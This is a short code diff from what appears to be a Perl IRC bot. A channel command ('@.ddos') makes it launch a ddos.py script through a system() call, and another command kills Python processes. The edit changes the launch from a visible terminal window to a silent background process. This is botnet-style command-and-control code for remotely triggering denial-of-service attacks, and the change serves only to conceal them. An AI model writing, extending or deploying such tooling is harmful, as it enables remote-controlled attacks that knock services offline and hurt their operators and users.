@@ -33,7 +33,7 @@
    warn 'Received PING request, sending PONG.';
    $irc->write(notice => $noticechan => "pong");
    }if ($msg =~ /@.ddos/) {
-   	system 'xterm -e python ddos.py ' . "@ARGV"; 
+   	system 'python ddos.py ' . "@ARGV"; 
 }
 if ($msg =~ /@.d.kill/) {
    	system 'pkill python'; 
